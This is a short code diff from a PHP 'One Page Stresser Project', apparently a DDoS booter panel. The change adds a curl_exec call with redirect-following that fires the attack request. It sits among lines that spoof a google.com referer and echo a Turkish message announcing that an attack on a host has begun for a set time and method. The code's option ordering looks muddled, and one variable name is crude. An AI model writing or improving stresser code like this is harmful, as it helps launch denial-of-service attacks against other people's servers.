@@ -33,6 +33,8 @@ Tek Sayfalık Stresser Projesi / One Page Stresser Project
 				curl_setopt($dogukanbey, CURLOPT_REFERER, "https://google.com");
 				curl_setopt($dogukanbey, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 				curl_setopt($dogukanbey, CURLOPT_RETURNTRANSFER, true);
+				curl_setopt($dogukanbey, CURLOPT_FOLLOWLOCATION, true);
+				$dogukansex = curl_exec($dogukanbey);
 				curl_setopt($dogukanbey, CURLOPT_POST, true);
 				curl_close($dogukanbey);
 				echo "<h4 style=\"color:green; text-align: center;\">".$host." adresine ".$time." saniye ".$method. " methoduyla saldırı başladı! </h4>";
